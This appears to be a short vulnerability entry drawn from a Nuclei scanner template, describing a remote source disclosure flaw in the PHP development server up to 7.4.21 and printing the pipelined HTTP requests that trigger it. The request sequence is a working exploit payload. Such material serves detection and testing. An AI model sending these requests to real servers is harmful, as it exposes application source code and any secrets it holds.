# Vulnerability: PHP Development Server <= 7.4.21 - Remote Source Disclosure
**Classification:** CWE-540
**Source:** Nuclei Template (`php-src-disclosure.yaml`)

## Description
A source code disclosure vulnerability in a web server caused by improper handling of multiple requests in quick succession, leading to the server treating requested files as static files instead of executing scripts.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /  HTTP/1.1
Host: {{Hostname}}

GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1

GET /  HTTP/1.1
Host: {{Hostname}}
```

